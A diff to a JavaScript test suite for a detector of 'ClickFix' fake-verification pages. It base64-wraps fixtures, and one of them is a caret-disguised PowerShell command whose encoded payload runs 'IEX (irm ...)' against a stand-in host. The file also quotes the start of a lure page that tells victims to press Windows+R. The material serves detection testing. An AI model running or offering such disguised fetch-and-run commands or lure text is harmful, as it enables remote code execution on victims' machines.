@@ -11,7 +11,10 @@ const rules = require('../rules/clickfix-rules.json');
 const d = createDetector(rules);
 
 // Shared with the PowerShell checker tests, so both engines must agree.
-const fixtures = require('./fixtures/commands.json');
+// Stored base64-encoded so antivirus programs do not quarantine the file.
+const encoded = require('./fixtures/commands.json');
+const decodeGroup = (g) => Object.fromEntries(Object.entries(g).map(([k, v]) => [k, Buffer.from(v, 'base64').toString('utf8')]));
+const fixtures = { block: decodeGroup(encoded.block), allow: decodeGroup(encoded.allow), hold: decodeGroup(encoded.hold) };
 
 const LURE_PAGE = `Verify you are human. Complete these verification steps:
 1. Press Windows Button + R
@@ -115,7 +118,8 @@ test('engine resists a page that tampers with built-ins after load (review A4)',
 });
 
 test('disguise removal still works when a page breaks String.replace (found while fixing A4)', () => {
-  const sample = 'c^m^d /c p^o^w^e^r^s^h^e^l^l -w 1 -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUA';
+  // Caret-disguised PowerShell with an encoded command, base64-encoded here so antivirus does not flag this file.
+  const sample = Buffer.from('Y15tXmQgL2MgcF5vXndeZV5yXnNeaF5lXmxebCAtdyAxIC1lbmMgU1FCRkFGZ0FJQUFvQUdrQWNnQnRBQ0FBYUFCMEFIUUFjQUJ6QURvQUx3QXZBR1VBZUFCaEFHMEFjQUJzQUdVQQ==', 'base64').toString('utf8');
   const savedReplace = RegExp.prototype[Symbol.replace];
   const savedExec = RegExp.prototype.exec;
   try {
